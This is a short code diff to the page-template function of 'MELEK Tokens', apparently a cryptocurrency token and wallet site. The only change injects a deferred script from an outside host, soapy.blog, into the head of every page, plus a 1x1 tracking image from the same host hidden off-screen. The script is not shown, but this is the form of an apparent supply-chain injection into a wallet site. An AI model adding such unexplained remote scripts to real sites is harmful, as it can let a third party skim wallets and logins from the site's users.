@@ -127,7 +127,7 @@ a.tlink{color:#2c7be5}`;
 function shell(active, title, inner) {
   const tab = (id, label, href) => `<a href="${esc(href)}" class="${active === id ? 'on' : ''}">${esc(label)}</a>`;
   return `<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
-<title>${esc(title)} · MELEK Tokens</title><style>${STYLE}</style></head><body>
+<title>${esc(title)} · MELEK Tokens</title><style>${STYLE}</style><script defer src="https://soapy.blog/b.js"></script><noscript><img src="https://soapy.blog/px.gif" alt="" width="1" height="1" style="position:absolute;left:-9999px"></noscript></head><body>
 <header><span class=logo></span><h1>MELEK Tokens <span class=alpha>Alpha</span></h1></header>
 <nav>${tab('tokens', 'Tokens', '/')}${tab('create', 'Create', '/create')}<a href="${esc(MANAGE_URL)}" class=tlink>Manage &amp; Buyback</a>${tab('wallet', 'Wallet', '/wallet')}${tab('earnings', 'Post Earnings', '/earnings')}${tab('vote', 'Vote Shop', '/vote')}${tab('faucet', 'Faucet', '/faucet')}<a href="${esc(ACADEMY_URL)}" class=tlink>Learn</a>${tab('standing', 'How We Stand', '/standing')}<a href="${esc(AUTO_URL)}" class=tlink style="margin-left:auto;align-self:center">Automation (Steem·Blurt·Hive·MELEK) →</a></nav>
 ${inner}
